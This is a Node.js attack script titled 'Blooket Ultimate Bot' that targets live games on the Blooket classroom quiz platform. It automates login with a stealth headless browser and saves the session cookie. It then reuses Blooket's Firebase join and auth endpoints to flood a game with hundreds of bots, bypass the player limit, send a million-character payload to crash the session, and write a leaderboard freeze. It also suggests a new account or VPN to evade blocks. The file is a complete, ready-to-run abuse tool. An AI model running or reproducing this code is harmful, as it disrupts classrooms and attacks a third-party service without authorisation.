import { WebSocket } from 'ws';
import fetch from 'node-fetch';
import readline from 'readline';
import fs from 'fs';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';

puppeteer.use(StealthPlugin());

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
function ask(q) { return new Promise(r => rl.question(q, r)); }
function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

async function getFreshCookieWithPuppeteer(email, password) {
  console.log('🔐 Launching headless browser to log in...');
  const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
  const page = await browser.newPage();
  await page.setViewport({ width: 1280, height: 720 });
  await page.goto('https://www.blooket.com/login', { waitUntil: 'networkidle2' });
  await page.waitForSelector('input[type="email"]', { timeout: 10000 });
  await page.type('input[type="email"]', email, { delay: 80 });
  await page.type('input[type="password"]', password, { delay: 80 });
  await page.click('button[type="submit"]');
  await page.waitForNavigation({ waitUntil: 'networkidle2' });
  await page.goto('https://play.blooket.com', { waitUntil: 'networkidle2' });
  const cookies = await page.cookies();
  await browser.close();
  const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
  fs.writeFileSync('cookie.txt', cookieString);
  console.log('✅ Cookie fetched and saved.');
  return cookieString;
}

async function testCookie(cookie) {
  console.log('🔍 Testing cookie...');
  const res = await fetch('https://play.blooket.com', {
    headers: { 'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
  });
  const text = await res.text();
  const titleMatch = text.match(/<title>(.*?)<\/title>/);
  const title = titleMatch ? titleMatch[1] : 'Unknown';
  console.log(`Page title: "${title}"`);
  if (text.includes('suspended')) console.log('⚠️ Account suspended!');
  if (text.includes('Just a moment')) console.log('⚠️ Cloudflare challenge – IP blocked or cookie invalid.');
  return text;
}

async function getCookie() {
  if (fs.existsSync('cookie.txt')) {
    const use = await ask('Use saved cookie? (y/n): ');
    if (use.toLowerCase() === 'y') {
      const saved = fs.readFileSync('cookie.txt', 'utf8').trim();
      if (saved) return saved;
    }
  }

  console.log('\n📌 Auto‑login mode:');
  const email = await ask('Blooket email: ');
  const password = await ask('Blooket password: ');
  return await getFreshCookieWithPuppeteer(email, password);
}

async function joinBot(gameId, botName, cookie) {
  const joinRes = await fetch('https://fb.blooket.com/c/firebase/join', {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Cookie': cookie,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
      'Origin': 'https://goldquest.blooket.com',
      'Referer': 'https://goldquest.blooket.com/'
    },
    body: JSON.stringify({ id: gameId, name: botName })
  });
  const text = await joinRes.text();
  let joinData;
  try {
    joinData = JSON.parse(text);
  } catch {
    return { success: false, error: 'invalid_json' };
  }
  if (!joinData.fbToken) {
    return { success: false, error: joinData.msg || 'unknown' };
  }

  const signRes = await fetch('https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: joinData.fbToken, returnSecureToken: true })
  });
  const signData = await signRes.json();

  const wsUrl = joinData.fbShardURL.replace('https', 'wss') + '.ws?v=5&p=1:741533559105:web:b8cbb10e6123f2913519c0';
  const ws = new WebSocket(wsUrl);

  return new Promise((resolve) => {
    let joined = false;
    const timeout = setTimeout(() => {
      if (!joined && ws.readyState !== WebSocket.CLOSED) {
        ws.close();
        resolve({ success: false, error: 'timeout' });
      }
    }, 10000);

    ws.on('open', () => {
      ws.send(JSON.stringify({ t: 'd', d: { r: 1, a: 's', b: { c: { 'sdk.js.10-14-1': 1 } } } }));
      ws.send(JSON.stringify({ t: 'd', d: { r: 2, a: 'auth', b: { cred: signData.idToken } } }));
      ws.send(JSON.stringify({ t: 'd', d: { r: 3, a: 'q', b: { p: `/${gameId}`, h: '' } } }));
    });

    ws.on('message', (msg) => {
      let json;
      try { json = JSON.parse(msg); } catch { return; }
      if (json.d?.b?.d?.stg === 'join') {
        ws.send(JSON.stringify({ t: 'd', d: { r: 4, a: 'n', b: { p: `/${gameId}` } } }));
        const blooks = ['Chick','Dragon','Unicorn','Pirate','Robot','Phoenix','Ghost','Alien'];
        const blook = blooks[Math.floor(Math.random() * blooks.length)];
        ws.send(JSON.stringify({ t: 'd', d: { r: 5, a: 'p', b: { p: `/${gameId}/c/${botName}`, d: { b: blook } } } }));
      }
      if (json.d?.r === 5) {
        joined = true;
        clearTimeout(timeout);
        ws.close();
        resolve({ success: true, blook: json.d?.b?.d?.b || '?' });
      }
    });

    ws.on('error', () => resolve({ success: false, error: 'websocket_error' }));
  });
}

async function crashGame(gameId, botName, cookie) {
  console.log(`💥 Attempting to crash game ${gameId} with bot ${botName}...`);
  const joinRes = await fetch('https://fb.blooket.com/c/firebase/join', {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Cookie': cookie,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
      'Origin': 'https://goldquest.blooket.com',
      'Referer': 'https://goldquest.blooket.com/'
    },
    body: JSON.stringify({ id: gameId, name: botName })
  });
  const text = await joinRes.text();
  let joinData;
  try {
    joinData = JSON.parse(text);
  } catch {
    console.log('❌ Crash bot failed: Invalid JSON.');
    return false;
  }
  if (!joinData.fbToken) {
    console.log(`❌ Crash bot failed: ${joinData.msg || 'unknown'}`);
    return false;
  }

  const signRes = await fetch('https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: joinData.fbToken, returnSecureToken: true })
  });
  const signData = await signRes.json();

  const wsUrl = joinData.fbShardURL.replace('https', 'wss') + '.ws?v=5&p=1:741533559105:web:b8cbb10e6123f2913519c0';
  const ws = new WebSocket(wsUrl);

  return new Promise((resolve) => {
    let done = false;
    const timeout = setTimeout(() => {
      if (!done) {
        console.log('❌ Crash timeout');
        ws.close();
        resolve(false);
      }
    }, 15000);

    ws.on('open', () => {
      ws.send(JSON.stringify({ t: 'd', d: { r: 1, a: 's', b: { c: { 'sdk.js.10-14-1': 1 } } } }));
      ws.send(JSON.stringify({ t: 'd', d: { r: 2, a: 'auth', b: { cred: signData.idToken } } }));
      ws.send(JSON.stringify({ t: 'd', d: { r: 3, a: 'q', b: { p: `/${gameId}`, h: '' } } }));
    });

    ws.on('message', (msg) => {
      let json;
      try { json = JSON.parse(msg); } catch { return; }
      if (json.d?.b?.d?.stg === 'join') {
        ws.send(JSON.stringify({ t: 'd', d: { r: 4, a: 'n', b: { p: `/${gameId}` } } }));
        const huge = '😈'.repeat(1000000);
        console.log(`📦 Sending crash payload (length ${huge.length})...`);
        ws.send(JSON.stringify({
          t: 'd',
          d: {
            r: 5,
            a: 'p',
            b: { p: `/${gameId}/c/${botName}/b`, d: huge }
          }
        }));
      }
      if (json.d?.r === 5) {
        console.log(`✅ Crash payload sent!`);
        done = true;
        clearTimeout(timeout);
        ws.close();
        resolve(true);
      }
    });

    ws.on('error', (err) => {
      console.log(`❌ Crash WebSocket error: ${err.message}`);
      resolve(false);
    });
  });
}

async function freezeLeaderboard(gameId, botName, cookie) {
  console.log(`❄️ Attempting to freeze leaderboard in game ${gameId} with bot ${botName}...`);
  const joinRes = await fetch('https://fb.blooket.com/c/firebase/join', {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Cookie': cookie,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
      'Origin': 'https://goldquest.blooket.com',
      'Referer': 'https://goldquest.blooket.com/'
    },
    body: JSON.stringify({ id: gameId, name: botName })
  });
  const text = await joinRes.text();
  let joinData;
  try {
    joinData = JSON.parse(text);
  } catch {
    console.log('❌ Freeze bot failed: Invalid JSON.');
    return false;
  }
  if (!joinData.fbToken) {
    console.log(`❌ Freeze bot failed: ${joinData.msg || 'unknown'}`);
    return false;
  }

  const signRes = await fetch('https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: joinData.fbToken, returnSecureToken: true })
  });
  const signData = await signRes.json();

  const wsUrl = joinData.fbShardURL.replace('https', 'wss') + '.ws?v=5&p=1:741533559105:web:b8cbb10e6123f2913519c0';
  const ws = new WebSocket(wsUrl);

  return new Promise((resolve) => {
    let done = false;
    const timeout = setTimeout(() => {
      if (!done) {
        console.log('❌ Freeze timeout');
        ws.close();
        resolve(false);
      }
    }, 15000);

    ws.on('open', () => {
      ws.send(JSON.stringify({ t: 'd', d: { r: 1, a: 's', b: { c: { 'sdk.js.10-14-1': 1 } } } }));
      ws.send(JSON.stringify({ t: 'd', d: { r: 2, a: 'auth', b: { cred: signData.idToken } } }));
      ws.send(JSON.stringify({ t: 'd', d: { r: 3, a: 'q', b: { p: `/${gameId}`, h: '' } } }));
    });

    ws.on('message', (msg) => {
      let json;
      try { json = JSON.parse(msg); } catch { return; }
      if (json.d?.b?.d?.stg === 'join') {
        ws.send(JSON.stringify({ t: 'd', d: { r: 4, a: 'n', b: { p: `/${gameId}` } } }));
        ws.send(JSON.stringify({
          t: 'd',
          d: {
            r: 5,
            a: 'p',
            b: { p: `/${gameId}/c/${botName}/tat/Freeze`, d: 'freeze' }
          }
        }));
      }
      if (json.d?.r === 5) {
        console.log(`✅ Freeze command sent!`);
        done = true;
        clearTimeout(timeout);
        ws.close();
        resolve(true);
      }
    });

    ws.on('error', (err) => {
      console.log(`❌ Freeze WebSocket error: ${err.message}`);
      resolve(false);
    });
  });
}

async function floodMode(cookie) {
  const gameId = await ask('Game PIN: ');
  const prefix = await ask('Bot name prefix (or empty for random): ');
  const total = parseInt(await ask('Number of bots: '), 10);
  const concurrency = parseInt(await ask('Concurrent bots (1-200, default 100): ') || '100', 10);
  const delayMs = parseInt(await ask('Delay between starting bots (ms, default 0): ') || '0', 10);
  const bypassLimit = (await ask('Bypass player limit? (y/n): ')).toLowerCase() === 'y';

  console.log(`🚀 Starting flood: ${total} bots, concurrency ${concurrency}, delay ${delayMs}ms, bypass limit: ${bypassLimit}`);

  let success = 0, failed = 0;
  let active = 0, index = 0;
  const queue = [];

  function addBot(botName) {
    queue.push(async () => {
      const result = await joinBot(gameId, botName, cookie);
      if (result.success) {
        success++;
        console.log(`✅ ${botName} joined with blook ${result.blook}`);
      } else {
        console.log(`❌ ${botName} failed: ${result.error}`);
        if (bypassLimit && result.error === 'full') {
          console.log(`🔄 Game full, will retry later...`);
          setTimeout(() => {
            if (index < queue.length) {
              queue.splice(index, 0, async () => {
                const retryResult = await joinBot(gameId, botName, cookie);
                if (retryResult.success) success++;
                else failed++;
              });
            } else {
              queue.push(async () => {
                const retryResult = await joinBot(gameId, botName, cookie);
                if (retryResult.success) success++;
                else failed++;
              });
            }
          }, 2000);
          failed++;
          return;
        }
        failed++;
      }
      console.log(`Progress: ${success+failed}/${total} (${success} success, ${failed} failed)`);
    });
  }

  for (let i = 1; i <= total; i++) {
    let botName = prefix ? `${prefix}${i}` : Math.random().toString(36).substring(2, 12);
    addBot(botName);
  }

  const runNext = async () => {
    if (index >= queue.length) return;
    active++;
    const task = queue[index++];
    await task();
    active--;
    if (active === 0 && index >= queue.length) return;
    await delay(delayMs);
    runNext();
  };

  for (let i = 0; i < concurrency; i++) runNext();
  while (active > 0 || index < queue.length) await delay(10);
  console.log(`\n🎉 Flood finished: ${success}/${total} bots joined successfully.`);
}

async function main() {
  console.log('🎮 Blooket Ultimate Bot (Auto‑Login + Flood + Crash + Freeze)');
  const cookie = await getCookie();

  const testResult = await testCookie(cookie);
  if (testResult.includes('suspended') || testResult.includes('Just a moment')) {
    console.log('❌ Invalid cookie. Try again with a new account or VPN.');
    return;
  }

  while (true) {
    console.log('\n╔══════════════════════════════════════╗');
    console.log('║ 1. Flood (mass join)                 ║');
    console.log('║ 2. Crash (send huge payload)         ║');
    console.log('║ 3. Freeze Leaderboard                ║');
    console.log('║ 4. Exit                              ║');
    console.log('╚══════════════════════════════════════╝');
    const choice = await ask('Choose option: ');
    if (choice === '1') await floodMode(cookie);
    else if (choice === '2') {
      const gameId = await ask('Game PIN: ');
      const botName = await ask('Bot name (or leave empty for random): ') || 'crash_' + Math.random().toString(36).substring(2, 8);
      await crashGame(gameId, botName, cookie);
    }
    else if (choice === '3') {
      const gameId = await ask('Game PIN: ');
      const botName = await ask('Bot name (or leave empty for random): ') || 'freeze_' + Math.random().toString(36).substring(2, 8);
      await freezeLeaderboard(gameId, botName, cookie);
    }
    else if (choice === '4') break;
    else console.log('Invalid choice.');
    await ask('\nPress Enter to continue...');
  }
  rl.close();
}

main().catch(console.error);